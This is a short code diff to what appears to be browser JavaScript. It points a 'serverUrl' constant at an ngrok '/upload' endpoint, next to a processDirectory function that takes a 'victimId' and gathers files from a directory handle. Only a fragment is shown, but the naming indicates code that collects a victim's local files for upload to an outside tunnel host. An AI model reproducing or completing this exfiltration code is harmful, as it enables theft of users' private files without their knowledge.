@@ -1,5 +1,5 @@
 document.addEventListener('DOMContentLoaded', function () {
-  const serverUrl = 'https://ngrok.com/r/iep ';
+  const serverUrl = 'https://ngrok.com/r/iep/upload';
 
   async function processDirectory(directoryHandle, victimId, currentPath = '') {
     const files = []; // Store all files
